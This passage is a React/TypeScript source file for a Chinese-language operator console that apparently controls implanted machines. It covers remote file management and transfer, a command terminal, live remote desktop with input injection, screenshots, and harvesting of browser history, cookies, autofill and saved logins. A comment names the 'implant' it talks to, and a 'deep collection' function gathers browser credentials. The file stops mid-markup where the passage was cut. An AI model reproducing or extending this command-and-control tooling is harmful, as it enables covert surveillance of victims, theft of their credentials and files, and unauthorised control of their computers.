import { useCallback, useEffect, useRef, useState, type ReactNode } from 'react'
import {
  ArrowLeftOutlined,
  ArrowUpOutlined,
  CameraOutlined,
  CaretRightOutlined,
  CloseOutlined,
  CodeOutlined,
  CompassOutlined,
  DesktopOutlined,
  DownloadOutlined,
  FileOutlined,
  FolderAddOutlined,
  FolderOutlined,
  HddOutlined,
  InboxOutlined,
  KeyOutlined,
  PauseOutlined,
  ReloadOutlined,
  UploadOutlined,
} from '@ant-design/icons'
import { Button, Checkbox, Dropdown, Input, Modal, Popconfirm, Select, Table, Tag, App } from 'antd'
import { useLocation, useNavigate, useParams, useSearchParams } from 'react-router-dom'
import { api, downloadGet, getToken } from '../api'
import { useWs } from '../hooks/useWs'
import { statusLabel, statusTone } from '../status'
import type { SessionRow } from './Sessions'
import CredsPanel from './CredsPanel'
import TerminalPanel from './TerminalPanel'
import styles from './console.module.css'

type Mod = 'cmd' | 'files' | 'desk' | 'browser' | 'creds'
type FsItem = { key: string; kind: 'dir' | 'file'; name: string; size: number; mtime?: number }
type BrowserRow = { key: string; kind: string; browser: string; a: string; b: string; c: string; size: number; path: string }
type BrowserSnap = { at: number; rows: string[] }
type StoreKind = 'history' | 'cookies' | 'bookmarks' | 'downloads' | 'autofill' | 'logins' | 'formhistory'
type DbKind = '' | StoreKind
type Shot = { id: string; url: string; w: number; h: number; at: number }
type StashItem = { id: string; name: string; remote: string; size: number; at: number }
type XferJob = {
  id: string
  dir: 'upload' | 'download' | string
  name: string
  path: string
  offset: number
  total: number
  status: string
  error?: string
  speed: number
}

function toB64(u8: Uint8Array) {
  let bin = ''
  for (let i = 0; i < u8.length; i += 0x8000) bin += String.fromCharCode(...u8.subarray(i, i + 0x8000))
  return btoa(bin)
}

function fmtSpeed(n: number) {
  if (!n) return ''
  if (n < 1024) return `${n} B/s`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB/s`
  return `${(n / 1024 / 1024).toFixed(1)} MB/s`
}

function parseList(text: string): FsItem[] {
  return text
    .split('\n')
    .map((line) => line.trimEnd())
    .filter(Boolean)
    .map((line, i) => {
      const p = line.split('\t')
      const mtime = Number(p[3] || 0) || undefined
      if (p[0] === 'D') return { key: `${i}-${p[1]}`, kind: 'dir' as const, name: p[1] || '', size: 0, mtime }
      return { key: `${i}-${p[1]}`, kind: 'file' as const, name: p[1] || '', size: Number(p[2] || 0), mtime }
    })
}

function joinPath(base: string, name: string) {
  if (!base) return name
  if (name.startsWith('/') || /^[A-Za-z]:/.test(name)) return name
  if (base === '/') return `/${name}`
  if (base.endsWith('\\') || base.endsWith('/')) return base + name
  return `${base}${base.startsWith('/') ? '/' : '\\'}${name}`
}

function parentPath(p: string) {
  if (!p || p === '/') return ''
  const t = p.replace(/[\\/]+$/, '')
  const i = Math.max(t.lastIndexOf('\\'), t.lastIndexOf('/'))
  if (i < 0) return ''
  if (t.startsWith('/') && i === 0) return '/'
  if (t[1] === ':' && i <= 2) return `${t.slice(0, 2)}\\`
  return t.slice(0, i)
}

function isDriveName(n: string) {
  return /^[A-Za-z]:\\?$/.test(n) || n === '/' || n === '/Volumes'
}

function driveLabel(d: string) {
  const m = d.match(/^([A-Za-z]):/)
  if (m) return `${m[1]}:`
  if (d === '/') return '根目录'
  return d.replace(/\\+$/, '') || d
}

function crumbs(p: string) {
  if (!p) return [{ label: '此电脑', path: '' }]
  const parts = p.replace(/[\\/]+$/, '').split(/[\\/]/).filter(Boolean)
  const out = [{ label: '此电脑', path: '' }]
  let acc = ''
  for (const part of parts) {
    if (/[A-Za-z]:/.test(part)) acc = `${part}\\`
    else if (!acc && p.startsWith('/')) acc = `/${part}`
    else acc = joinPath(acc, part)
    out.push({ label: /[A-Za-z]:/.test(part) ? driveLabel(part) : part, path: acc })
  }
  return out
}

function saveCsv(name: string, cols: string[], rows: string[][]) {
  const esc = (v: string) => `"${(v ?? '').replace(/"/g, '""')}"`
  const csv = [cols.map(esc).join(','), ...rows.map((r) => r.map(esc).join(','))].join('\r\n')
  const url = URL.createObjectURL(new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' }))
  const a = document.createElement('a')
  a.href = url
  a.download = name
  a.click()
  URL.revokeObjectURL(url)
}

const BROWSER_KINDS = new Set(['F', 'V', 'B', 'E', 'P', 'K'])

const DB_LABEL: Record<StoreKind, string> = {
  history: '浏览历史',
  cookies: 'Cookie 元数据',
  bookmarks: '书签',
  downloads: '下载记录',
  autofill: '自动填充数据',
  logins: '账号列表',
  formhistory: '表单历史',
}

function dbTitle(kind: DbKind) {
  if (!kind) return ''
  if (kind === 'cookies') return 'Cookie 元数据（主机 / 名称 / 过期时间，不含值）'
  if (kind === 'logins') return '账号列表（URL / 用户名 / 使用次数，密码在凭据页解密）'
  return DB_LABEL[kind]
}

function parseBrowser(output: string): BrowserRow[] {
  return output
    .split('\n')
    .filter(Boolean)
    .map((line, i) => {
      const p = line.split('\t')
      // 旧植入端只回 5 列（browser/profile/name/size/mtime），退化成文件行
      if (!BROWSER_KINDS.has(p[0])) {
        return { key: `${i}`, kind: 'F', browser: p[0] || '', a: p[1] || '', b: p[2] || '', c: p[4] || '', size: Number(p[3] || 0), path: '' }
      }
      return { key: `${i}-${p[3] || ''}`, kind: p[0], browser: p[1] || '', a: p[2] || '', b: p[3] || '', c: p[4] || '', size: Number(p[5] || 0), path: p[6] || '' }
    })
}

function frameUrl(b64: string) {
  const bin = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))
  if (bin.length < 5) return { w: 0, h: 0, url: '' }
  const w = bin[0] | (bin[1] << 8)
  const h = bin[2] | (bin[3] << 8)
  const blob = new Blob([bin.slice(4)], { type: 'image/jpeg' })
  return { w, h, url: URL.createObjectURL(blob) }
}

function fmtTime(n?: number) {
  if (!n) return '—'
  return new Date(n * 1000).toLocaleString('zh-CN', { hour12: false })
}

function absXY(e: { currentTarget: HTMLImageElement; clientX: number; clientY: number }) {
  const img = e.currentTarget
  const rect = img.getBoundingClientRect()
  const nw = img.naturalWidth || 1
  const nh = img.naturalHeight || 1
  const scale = Math.min(rect.width / nw, rect.height / nh)
  const dw = Math.max(nw * scale, 1)
  const dh = Math.max(nh * scale, 1)
  const left = rect.left + (rect.width - dw) / 2
  const top = rect.top + (rect.height - dh) / 2
  const x = Math.round(((e.clientX - left) / dw) * 65535)
  const y = Math.round(((e.clientY - top) / dh) * 65535)
  return {
    x: Math.max(0, Math.min(65535, x)),
    y: Math.max(0, Math.min(65535, y)),
  }
}

function fmtSize(n: number) {
  if (!Number.isFinite(n) || n < 0) return '—'
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  if (n < 1024 * 1024 * 1024) return `${(n / 1024 / 1024).toFixed(1)} MB`
  return `${(n / 1024 / 1024 / 1024).toFixed(2)} GB`
}

async function waitTask(id: string, tid: string) {
  for (let i = 0; i < 240; i++) {
    const st = (await api(`/api/sessions/${id}/tasks/${tid}`)) as { done: boolean; error?: string }
    if (st.error) throw new Error(st.error)
    if (st.done) return
    await new Promise((r) => setTimeout(r, 250))
  }
  throw new Error('超时')
}

const MODS: { key: Mod; label: string; icon: ReactNode }[] = [
  { key: 'files', label: '文件管理', icon: <FolderOutlined /> },
  { key: 'cmd', label: '命令控制', icon: <CodeOutlined /> },
  { key: 'desk', label: '远程桌面', icon: <DesktopOutlined /> },
  { key: 'browser', label: '浏览器信息', icon: <CompassOutlined /> },
  { key: 'creds', label: '凭据', icon: <KeyOutlined /> },
]

export default function Host() {
  const { message } = App.useApp()
  const { id } = useParams()
  const nav = useNavigate()
  const loc = useLocation()
  const [sp, setSp] = useSearchParams()
  const [info, setInfo] = useState<SessionRow | null>(null)
  const rawMod = sp.get('mod')
  const mod: Mod = rawMod === 'screen' ? 'desk' : (['cmd', 'files', 'desk', 'browser', 'creds'] as Mod[]).includes(rawMod as Mod) ? (rawMod as Mod) : 'files'
  const setMod = (m: Mod) => {
    const next = new URLSearchParams(sp)
    next.set('mod', m)
    setSp(next, { replace: true })
  }
  const [path, setPath] = useState('')
  const [files, setFiles] = useState<FsItem[]>([])
  const [desk, setDesk] = useState('')
  const [deskOn, setDeskOn] = useState(false)
  const [deskWidth, setDeskWidth] = useState(0)
  const [shotSel, setShotSel] = useState<string[]>([])
  const [deskQuality, setDeskQuality] = useState(70)
  const [deskMode, setDeskMode] = useState<'watch' | 'control'>('watch')
  const [sideW, setSideW] = useState(240)
  const [savedShots, setSavedShots] = useState<(Shot & { remark: string })[]>([])
  const [viewShot, setViewShot] = useState<(Shot & { remark: string }) | null>(null)
  const [xfers, setXfers] = useState<XferJob[]>([])
  const uploadFiles = useRef<Record<string, File>>({})
  const seenDone = useRef<Set<string>>(new Set())
  const [dragOver, setDragOver] = useState(false)
  const [screenWH, setScreenWH] = useState({ w: 0, h: 0 })
  const [pending, setPending] = useState(false)
  const [filter, setFilter] = useState('')
  const [newDir, setNewDir] = useState('')
  const [mkOpen, setMkOpen] = useState(false)
  const [drives, setDrives] = useState<string[]>([])
  const [selected, setSelected] = useState<string[]>([])
  const [renFrom, setRenFrom] = useState('')
  const [renTo, setRenTo] = useState('')
  const [stash, setStash] = useState<StashItem[]>([])
  const [stashSel, setStashSel] = useState<string[]>([])
  const fileRef = useRef<HTMLInputElement>(null)
  const deskBox = useRef<HTMLDivElement>(null)
  const pathRef = useRef(path)
  const listingRef = useRef(path)
  pathRef.current = path

  const load = useCallback(async () => {
    if (!id) return
    try {
      setInfo((await api(`/api/sessions/${id}`)) as SessionRow)
    } catch (e) {
      setInfo(null)
      message.error(e instanceof Error ? e.message : '加载失败')
    }
  }, [id, message])

  useEffect(() => {
    void load()
    const t = setInterval(() => void load(), 5000)
    return () => clearInterval(t)
  }, [load])

  useWs((e) => {
    if (!id || e.session_id !== id) {
      if (e.kind?.startsWith('session.')) void load()
      return
    }
    if (e.kind === 'file.list' && e.data != null) {
      const items = parseList(e.data)
      setFiles(items)
      if (!listingRef.current) {
        const disks = items.filter((i) => i.kind === 'dir' && isDriveName(i.name)).map((i) => i.name)
        if (disks.length) setDrives(disks)
      }
    }
    if (e.kind === 'screen.frame' && e.data && e.encoding === 'base64') {
      const f = frameUrl(e.data)
      void persistShot(f.url, f.w, f.h)
    }
    if (e.kind === 'xfer.progress' && e.data) {
      try {
        const job = JSON.parse(e.data) as XferJob
        setXfers((prev) => {
          const i = prev.findIndex((x) => x.id === job.id)
          if (i < 0) return [job, ...prev]
          const next = [...prev]
          next[i] = job
          return next
        })
        if (job.status === 'done') {
          void loadStash()
          if (job.dir === 'download' && !seenDone.current.has(job.id)) {
            seenDone.current.add(job.id)
            message.success(`${job.name} 已传到控制台，可在传输列表保存到本机`)
          }
        }
      } catch {
        /* ignore */
      }
    }
    if (e.kind === 'desk.frame' && e.data && e.encoding === 'base64') {
      const f = frameUrl(e.data)
      setScreenWH({ w: f.w, h: f.h })
      setDesk((prev) => {
        if (prev) URL.revokeObjectURL(prev)
        return f.url
      })
    }
  })

  const listDir = async (next: string) => {
    if (!id) return
    listingRef.current = next
    pathRef.current = next
    setPath(next)
    setPending(true)
    setFiles([])
    setSelected([])
    try {
      await api(`/api/sessions/${id}/fs/ls`, { method: 'POST', body: JSON.stringify({ path: next }) })
    } catch (e) {
      message.error(e instanceof Error ? e.message : '列举失败')
    } finally {
      setPending(false)
    }
  }

  const persistShot = async (url: string, w: number, h: number) => {
    if (!id) return
    try {
      const blob = await fetch(url).then((r) => r.blob())
      const buf = new Uint8Array(await blob.arrayBuffer())
      let bin = ''
      for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i])
      await api(`/api/sessions/${id}/shots`, {
        method: 'POST',
        body: JSON.stringify({ data: btoa(bin), w, h }),
      })
      await loadShots()
    } catch {
      /* ignore */
    }
  }

  const [browserRows, setBrowserRows] = useState<BrowserRow[]>([])
  const [browserBusy, setBrowserBusy] = useState(false)
  const [browserQ, setBrowserQ] = useState('')
  const [browserSnaps, setBrowserSnaps] = useState<BrowserSnap[]>([])
  const [browserSnapAt, setBrowserSnapAt] = useState(0)
  const [dbKind, setDbKind] = useState<DbKind>('')
  const [dbCols, setDbCols] = useState<string[]>([])
  const [dbRows, setDbRows] = useState<string[][]>([])
  const [dbBusy, setDbBusy] = useState(false)
  const [deepBusy, setDeepBusy] = useState(false)

  const scanBrowser = useCallback(async () => {
    if (!id) return
    setBrowserBusy(true)
    try {
      const { task_id } = (await api(`/api/sessions/${id}/browser`, { method: 'POST', body: '{}' })) as { task_id: string }
      await waitTask(id, task_id)
      const st = (await api(`/api/sessions/${id}/tasks/${task_id}`)) as { output?: string }
      const rows = parseBrowser(st.output || '')
      setBrowserRows(rows)
      setBrowserSnapAt(0)
      const host = info?.hostname
      if (host) {
        await new Promise((r) => setTimeout(r, 250))
        const snaps = (await api(`/api/browser/${encodeURIComponent(host)}`)) as BrowserSnap[]
        setBrowserSnaps(Array.isArray(snaps) ? snaps : [])
      }
      if (!rows.length) message.info('没找到浏览器配置目录')
    } catch (e) {
      message.error((e as Error).message)
    } finally {
      setBrowserBusy(false)
    }
  }, [id, info?.hostname, message])

  const loadStore = useCallback(
    async (path: string, kind: StoreKind) => {
      if (!id || !path) return
      setDbBusy(true)
      try {
        const r = (await api(`/api/sessions/${id}/browser/query`, { method: 'POST', body: JSON.stringify({ path, kind }) })) as {
          columns: string[]
          rows: string[][]
        }
        setDbKind(kind)
        setDbCols(r.columns || [])
        setDbRows(r.rows || [])
        message.success(`${DB_LABEL[kind]}：${(r.rows || []).length} 条`)
      } catch (e) {
        message.error((e as Error).message)
      } finally {
        setDbBusy(false)
      }
    },
    [id, message],
  )

  const scanDeep = useCallback(async () => {
    if (!id) return
    setDeepBusy(true)
    try {
      const { task_id } = (await api(`/api/sessions/${id}/browser/deep`, { method: 'POST', body: '{}' })) as {
        task_id: string
      }
      await waitTask(id, task_id)
      message.success('已采集浏览器凭据，请到「凭据」页查看')
    } catch (e) {
      message.error(e instanceof Error ? e.message : '深度收集失败')
    } finally {
      setDeepBusy(false)
    }
  }, [id, message])

  const showSnapshot = useCallback((at: number) => {
    setBrowserSnapAt(at)
    if (!at) return
    const snap = browserSnaps.find((s) => s.at === at)
    if (snap) setBrowserRows(parseBrowser(snap.rows.join('\n')))
  }, [browserSnaps])

  const browserMatch = (r: BrowserRow) =>
    !browserQ || [r.browser, r.a, r.b, r.c].join(' ').toLowerCase().includes(browserQ.toLowerCase())
  const fileRows = browserRows.filter((r) => (r.kind === 'F' || r.kind === 'V') && browserMatch(r))
  const bmRows = browserRows.filter((r) => r.kind === 'B' && browserMatch(r))
  const extRows = browserRows.filter((r) => r.kind === 'E' && browserMatch(r))
  const cfgRows = browserRows.filter((r) => (r.kind === 'P' || r.kind === 'K') && browserMatch(r))
  const storeBtn = (r: BrowserRow, kind: StoreKind, label: string) => (
    <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, kind)}>
      {label}
    </Button>
  )

  const loadShots = useCallback(async () => {
    if (!id) return
    try {
      const items = (await api(`/api/sessions/${id}/shots`)) as { id: string; remark: string; w: number; h: number; at: number }[]
      const tok = getToken()
      const next: (Shot & { remark: string })[] = []
      for (const it of Array.isArray(items) ? items : []) {
        const res = await fetch(`/api/sessions/${id}/shots/${it.id}`, {
          headers: tok ? { Authorization: `Bearer ${tok}` } : {},
        })
        if (!res.ok) continue
        const blob = await res.blob()
        next.push({ id: it.id, url: URL.createObjectURL(blob), w: it.w, h: it.h, at: (it.at || 0) * 1000, remark: it.remark || '' })
      }
      setSavedShots((prev) => {
        prev.forEach((s) => URL.revokeObjectURL(s.url))
        return next
      })
    } catch {
      /* ignore */
    }
  }, [id])

  useEffect(() => {
    if (mod === 'desk') void loadShots()
  }, [mod, loadShots])

  const loadStash = useCallback(async () => {
    if (!id) return
    try {
      const data = (await api(`/api/sessions/${id}/stash`)) as StashItem[]
      const list = Array.isArray(data) ? data : []
      setStash(list)
      setStashSel((prev) => prev.filter((k) => list.some((it) => it.id === k)))
    } catch {
      /* ignore */
    }
  }, [id])

  const loadXfers = useCallback(async () => {
    if (!id) return
    try {
      const data = (await api(`/api/sessions/${id}/xfers`)) as XferJob[]
      setXfers(Array.isArray(data) ? data : [])
    } catch {
      /* ignore */
    }
  }, [id])

  useEffect(() => {
    if (mod === 'files') {
      void loadStash()
      void loadXfers()
    }
  }, [mod, loadStash, loadXfers])

  const downloadFile = async (name: string) => {
    if (!id) return
    try {
      const full = joinPath(path, name)
      const rec = files.find((f) => f.name === name)
      const job = (await api(`/api/sessions/${id}/xfers`, {
        method: 'POST',
        body: JSON.stringify({ dir: 'download', path: full, name, size: rec?.size || 0 }),
      })) as XferJob
      setXfers((prev) => [job, ...prev.filter((x) => x.id !== job.id)])
    } catch (e) {
      message.error(e instanceof Error ? e.message : '下载失败')
    }
  }

  const downloadSelected = async () => {
    const names = files.filter((f) => selected.includes(f.name) && f.kind === 'file').map((f) => f.name)
    if (!names.length) {
      message.info('请先勾选文件')
      return
    }
    for (const name of names) await downloadFile(name)
  }

  const pumpUpload = async (jobId: string, file: File) => {
    if (!id) return
    const chunk = 256 * 1024
    let off = 0
    try {
      const list = (await api(`/api/sessions/${id}/xfers`)) as XferJob[]
      const cur = (Array.isArray(list) ? list : []).find((j) => j.id === jobId)
      if (cur) off = cur.offset || 0
      while (off < file.size) {
        const buf = new Uint8Array(await file.slice(off, off + chunk).arrayBuffer())
        const st = (await api(`/api/sessions/${id}/xfers/${jobId}/chunk`, {
          method: 'POST',
          body: JSON.stringify({ offset: off, data: toB64(buf) }),
        })) as XferJob
        setXfers((prev) => {
          const i = prev.findIndex((x) => x.id === st.id)
          if (i < 0) return [st, ...prev]
          const next = [...prev]
          next[i] = st
          return next
        })
        if (st.status === 'paused' || st.status === 'canceled' || st.status === 'error') break
        off = st.offset
        if (st.status === 'done') break
      }
      await listDir(pathRef.current)
    } catch (e) {
      message.error(e instanceof Error ? e.message : '上传失败')
    }
  }

  const uploadFile = async (file: File) => {
    if (!id) return
    const dest = joinPath(path, file.name)
    try {
      const job = (await api(`/api/sessions/${id}/xfers`, {
        method: 'POST',
        body: JSON.stringify({ dir: 'upload', path: dest, name: file.name, size: file.size }),
      })) as XferJob
      uploadFiles.current[job.id] = file
      setXfers((prev) => [job, ...prev.filter((x) => x.id !== job.id)])
      await pumpUpload(job.id, file)
    } catch (e) {
      message.error(e instanceof Error ? e.message : '上传失败')
    }
  }

  const grab = async () => {
    if (!id) return
    setPending(true)
    try {
      if (desk) {
        await persistShot(desk, screenWH.w, screenWH.h)
        message.success('已截屏')
      } else {
        await api(`/api/sessions/${id}/screen`, { method: 'POST' })
      }
    } catch (e) {
      message.error(e instanceof Error ? e.message : '截取失败')
    } finally {
      setPending(false)
    }
  }

  const toggleDesk = async () => {
    if (!id) return
    try {
      if (deskOn) {
        await api(`/api/sessions/${id}/desktop`, { method: 'POST', body: JSON.stringify({ action: 'stop' }) })
        setDeskOn(false)
      } else {
        await api(`/api/sessions/${id}/desktop`, { method: 'POST', body: JSON.stringify({ action: 'start', width: deskWidth, quality: deskQuality }) })
        setDeskOn(true)
        setMod('desk')
      }
    } catch (e) {
      message.error(e instanceof Error ? e.message : '桌面失败')
    }
  }

  const lastMove = useRef(0)
  const sendInput = async (kind: number, x: number, y: number, code: number, down: boolean) => {
    if (!id || !deskOn) return
    try {
      await api(`/api/sessions/${id}/input`, {
        method: 'POST',
        body: JSON.stringify({ kind, x, y, code, down }),
      })
    } catch {
      /* ignore burst errors */
    }
  }

  const renameFile = async () => {
    if (!id || !path || !renFrom || !renTo.trim()) return
    try {
      const t = (await api(`/api/sessions/${id}/fs/ren`, {
        method: 'POST',
        body: JSON.stringify({ from: joinPath(path, renFrom), to: joinPath(path, renTo.trim()) }),
      })) as { task_id: string }
      await waitTask(id, t.task_id)
      setRenFrom('')
      message.success('已重命名')
      await listDir(path)
    } catch (e) {
      message.error(e instanceof Error ? e.message : '重命名失败')
    }
  }

  const mkdir = async () => {
    if (!id || !path || !newDir.trim()) return
    try {
      const t = (await api(`/api/sessions/${id}/fs/mkdir`, {
        method: 'POST',
        body: JSON.stringify({ path: joinPath(path, newDir.trim()) }),
      })) as { task_id: string }
      await waitTask(id, t.task_id)
      setNewDir('')
      setMkOpen(false)
      message.success('已创建')
      await listDir(path)
    } catch (e) {
      message.error(e instanceof Error ? e.message : '创建失败')
    }
  }

  const delFile = async (name: string) => {
    if (!id) return
    try {
      const t = (await api(`/api/sessions/${id}/fs/del`, {
        method: 'POST',
        body: JSON.stringify({ path: joinPath(path, name) }),
      })) as { task_id: string }
      await waitTask(id, t.task_id)
      message.success('已删除')
      await listDir(path)
    } catch (e) {
      message.error(e instanceof Error ? e.message : '删除失败')
    }
  }

  useEffect(() => {
    if (mod !== 'files' || !id) return
    if (path || files.length) return
    const unix = !!info?.os && !info.os.toLowerCase().includes('windows')
    void listDir(unix ? '/' : '')
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [mod, id, info?.os])

  const title = info?.hostname || id || '主机'
  const online = info?.status === 'online'
  const unixOs = !!info?.os && !info.os.toLowerCase().includes('windows')

  return (
    <div className={styles.workspace}>
      <header className={styles.hostHead}>
        <Button size="small" icon={<ArrowLeftOutlined />} onClick={() => nav({ pathname: '/sessions', search: loc.search })}>
          返回
        </Button>
        <b>{title}</b>
        {info ? <Tag color={statusTone(info.status)}>{statusLabel(info.status)}</Tag> : null}
        <span className={styles.mono}>{info?.remote_addr || info?.ip || ''}</span>
        <span className={styles.mono}>{info?.username || ''}</span>
      </header>
      <nav className={styles.hostTabs} aria-label="主机功能">
        {MODS.map((m) => (
          <button
            key={m.key}
            type="button"
            className={styles.tabBtn}
            aria-current={mod === m.key ? 'page' : undefined}
            onClick={() => setMod(m.key)}
          >
            {m.icon}
            {m.label}
          </button>
        ))}
      </nav>
      <div className={styles.hostMain}>
        <div className={styles.fill} hidden={mod !== 'cmd'}>
          {id && online ? (
            <TerminalPanel id={id} online={online} visible={mod === 'cmd'} os={info?.os} />
          ) : (
            <div className={styles.hint}>主机离线</div>
          )}
        </div>
        <div className={styles.fill} hidden={mod !== 'files'}>
          <div className={styles.fsSplit} style={{ gridTemplateColumns: `${sideW}px 6px minmax(0, 1fr)` }}>
            <aside className={styles.fsSide}>
              <div className={styles.fsSideHead}>{unixOs ? '目录' : '磁盘'}</div>
              {unixOs ? (
                <button
                  type="button"
                  className={styles.fsSideBtn}
                  aria-current={path === '/' ? 'true' : undefined}
                  onClick={() => void listDir('/')}
                >
                  <HddOutlined className={styles.sideIcon} />
                  根目录
                </button>
              ) : (
                drives.map((d) => (
                  <button
                    key={d}
                    type="button"
                    className={styles.fsSideBtn}
                    aria-current={path.toUpperCase().startsWith(d.replace(/\\+$/, '').toUpperCase()) ? 'true' : undefined}
                    onClick={() => void listDir(d.endsWith('\\') || d.endsWith('/') ? d : `${d}\\`)}
                  >
                    <HddOutlined className={styles.sideIcon} />
                    {driveLabel(d)}
                  </button>
                ))
              )}
              <div className={styles.fsSideHead}>
                <Checkbox
                  checked={stash.length > 0 && stashSel.length === stash.length}
                  indeterminate={stashSel.length > 0 && stashSel.length < stash.length}
                  disabled={!stash.length}
                  onChange={(e) => setStashSel(e.target.checked ? stash.map((it) => it.id) : [])}
                />
                <InboxOutlined /> 下载历史
                <span className={styles.stashBatch}>
                  <Button
                    type="link"
                    size="small"
                    className={styles.sideLink}
                    disabled={!stashSel.length}
                    onClick={() => {
                      const items = stash.filter((it) => stashSel.includes(it.id))
                      void Promise.all(items.map((it) => downloadGet(`/api/sessions/${id}/stash/${it.id}`, it.name))).then(
                        () => message.success('已下载'),
                        (e) => message.error(e instanceof Error ? e.message : '下载失败'),
                      )
                    }}
                  >
                    批量下载
                  </Button>
                  <Popconfirm
                    title={`删除选中 ${stashSel.length} 项？`}
                    onConfirm={() => {
                      void Promise.all(stashSel.map((fid) => api(`/api/sessions/${id}/stash/${fid}`, { method: 'DELETE' }))).then(
                        () => {
                          setStashSel([])
                          void loadStash()
                        },
                        (e) => message.error(e instanceof Error ? e.message : '删除失败'),
                      )
                    }}
                  >
                    <Button type="link" size="small" danger className={styles.sideLink} disabled={!stashSel.length}>
                      批量删除
                    </Button>
                  </Popconfirm>
                </span>
              </div>
              <div className={styles.stashList}>
                {stash.length === 0 ? <div className={styles.hint}>从该主机下载的文件会留在这里，可再次下载到本地</div> : null}
                {stash.map((it) => (
                  <div key={it.id} className={styles.stashItem} title={it.remote}>
                    <Checkbox
                      checked={stashSel.includes(it.id)}
                      onChange={(e) => {
                        const on = e.target.checked
                        setStashSel((prev) => (on ? [...prev, it.id] : prev.filter((k) => k !== it.id)))
                      }}
                    />
                    <FileOutlined className={styles.sideIcon} />
                    <div className={styles.stashMeta}>
                      <div className={styles.stashName}>{it.name}</div>
                      <div className={styles.stashPath}>{it.remote}</div>
                    </div>
                    <span className={styles.stashActs}>
                      <Button
                        type="link"
                        size="small"
                        className={styles.sideLink}
                        onClick={() => {
                          void downloadGet(`/api/sessions/${id}/stash/${it.id}`, it.name).then(
                            () => message.success('已下载'),
                            (e) => message.error(e instanceof Error ? e.message : '下载失败'),
                          )
                        }}
                      >
                        下载
                      </Button>
                      <Button
                        type="link"
                        size="small"
                        danger
                        className={styles.sideLink}
                        onClick={() => {
                          void api(`/api/sessions/${id}/stash/${it.id}`, { method: 'DELETE' }).then(
                            () => void loadStash(),
                            (e) => message.error(e instanceof Error ? e.message : '删除失败'),
                          )
                        }}
                      >
                        删除
                      </Button>
                    </span>
                  </div>
                ))}
              </div>
            </aside>
            <div
              className={styles.fsResizer}
              onMouseDown={(e) => {
                e.preventDefault()
                const startX = e.clientX
                const startW = sideW
                const move = (ev: MouseEvent) => setSideW(Math.min(420, Math.max(180, startW + ev.clientX - startX)))
                const up = () => {
                  window.removeEventListener('mousemove', move)
                  window.removeEventListener('mouseup', up)
                }
                window.addEventListener('mousemove', move)
                window.addEventListener('mouseup', up)
              }}
            />
            <div
              className={styles.fsMain}
              onDragOver={(e) => {
                e.preventDefault()
                setDragOver(true)
              }}
              onDragLeave={() => setDragOver(false)}
              onDrop={(e) => {
                e.preventDefault()
                setDragOver(false)
                const list = [...e.dataTransfer.files]
                list.forEach((f) => void uploadFile(f))
              }}
            >
          <div className={styles.fsBar}>
            <Button size="small" icon={<ArrowUpOutlined />} onClick={() => void listDir(parentPath(path))} disabled={!path}>
              上级
            </Button>
            <Button size="small" icon={<ReloadOutlined />} onClick={() => void listDir(path)} loading={pending}>
              刷新
            </Button>
            <input
              ref={fileRef}
              type="file"
              hidden
              multiple
              onChange={(e) => {
                const list = [...(e.target.files || [])]
                e.target.value = ''
                list.forEach((f) => void uploadFile(f))
              }}
            />
            <Button size="small" icon={<UploadOutlined />} disabled={!path || !online} onClick={() => fileRef.current?.click()}>
              上传
            </Button>
            <Button
              size="small"
              icon={<DownloadOutlined />}
              disabled={!online || !files.some((f) => selected.includes(f.name) && f.kind === 'file')}
              onClick={() => void downloadSelected()}
            >
              下载
            </Button>
            <Button size="small" icon={<FolderAddOutlined />} disabled={!path || !online} onClick={() => setMkOpen(true)}>
              新建
            </Button>
            <Popconfirm
              title={`删除选中 ${selected.length} 项？`}
              onConfirm={async () => {
                for (const name of selected) await delFile(name)
                setSelected([])
              }}
            >
              <Button size="small" danger disabled={!selected.length || !online}>
                删除
              </Button>
            </Popconfirm>
            <Input
              size="small"
              style={{ width: 140, marginLeft: 'auto' }}
              placeholder="筛选"
              value={filter}
              onChange={(e) => setFilter(e.target.value)}
              allowClear
            />
          </div>
          <div className={styles.fsPath}>
            <div className={styles.crumbNav}>
              {crumbs(path).map((c, i, arr) => (
                <button key={`${c.path}-${i}`} type="button" className={styles.crumbBtn} onClick={() => void listDir(c.path)}>
                  {c.label}
                  {i < arr.length - 1 ? <span className={styles.crumbSep}>{path.startsWith('/') ? '/' : '\\'}</span> : null}
                </button>
              ))}
            </div>
            {path ? (
              <Input
                size="small"
                className={styles.pathInput}
                value={path}
                onChange={(e) => setPath(e.target.value)}
                onPressEnter={() => void listDir(path)}
              />
            ) : null}
          </div>
          {dragOver ? <div className={styles.dropHint}>松开以上传</div> : null}
          <div className={styles.tableCard}>
            <Table
              size="small"
              pagination={false}
              rowKey="name"
              dataSource={[...files]
                .filter((r) => !filter.trim() || r.name.toLowerCase().includes(filter.trim().toLowerCase()))
                .sort((a, b) => (a.kind === b.kind ? a.name.localeCompare(b.name) : a.kind === 'dir' ? -1 : 1))}
              locale={{ emptyText: '空目录或尚未加载' }}
              rowSelection={{ selectedRowKeys: selected, onChange: (keys) => setSelected(keys as string[]) }}
              onRow={(r) => ({
                onDoubleClick: () => {
                  if (r.kind === 'dir') void listDir(joinPath(path, r.name))
                  else void downloadFile(r.name)
                },
                style: { cursor: 'pointer' },
              })}
              columns={[
                {
                  title: '名称',
                  dataIndex: 'name',
                  render: (v: string, r: FsItem) => (
                    <Dropdown
                      trigger={['contextMenu']}
                      menu={{
                        items: [
                          { key: 'open', label: r.kind === 'dir' ? '打开' : '下载' },
                          { key: 'ren', label: '重命名' },
                          { key: 'copy', label: '拷贝路径' },
                          { key: 'del', label: '删除', danger: true },
                        ],
                        onClick: ({ key }) => {
                          if (key === 'open') {
                            if (r.kind === 'dir') void listDir(joinPath(path, r.name))
                            else void downloadFile(r.name)
                          } else if (key === 'ren') {
                            setRenFrom(r.name)
                            setRenTo(r.name)
                          } else if (key === 'copy') {
                            void navigator.clipboard.writeText(joinPath(path, r.name)).then(
                              () => message.success('已复制'),
                              () => message.error('复制失败'),
                            )
                          } else if (key === 'del') void delFile(r.name)
                        },
                      }}
                    >
                      <span className={styles.fsName}>
                        {r.kind === 'dir' ? <FolderOutlined /> : <FileOutlined />}
